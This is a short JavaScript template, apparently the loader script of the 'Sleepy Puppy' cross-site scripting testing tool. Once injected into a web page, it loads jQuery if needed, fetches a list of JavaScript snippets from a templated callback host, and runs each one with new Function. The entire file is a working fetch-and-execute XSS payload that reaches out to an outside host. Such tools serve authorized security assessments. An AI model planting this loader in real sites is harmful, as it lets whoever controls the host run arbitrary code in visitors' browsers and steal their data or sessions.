// Always load jQuery regardless of Javascripts
if (typeof jQuery === 'undefined') {

    function getScript(url, success) {
        var script = document.createElement('script');
        script.src = url;

        var head = document.getElementsByTagName('head')[0],
        done = false;

        script.onload = script.onreadystatechange = function () {

            if (!done && (!this.readyState || this.readyState === 'loaded' || this.readyState === 'complete')) {
                done = true;
                success();
                script.onload = script.onreadystatechange = null;
                head.removeChild(script);
            }
        };

        head.appendChild(script);
    }

    getScript('{{callback_protocol}}://{{hostname}}/static/jquery-1.11.3.min.js', function () {
        loader();
    });

} else {
    $(document).ready(loader);
}

function loader () {
    $.ajax({
    type: 'GET',
    url: "{{callback_protocol}}://{{hostname}}/api/puppyscript_loader/{{payload}}?a={{assessment}}",
    dataType: 'json',
    success: function (data) {
        $.each(data, function(index, element) {
            new Function(element.code)();
            // debug
            // console.log("Sleepy Puppy is executing Javascript " + index)
        });
    }
});
}
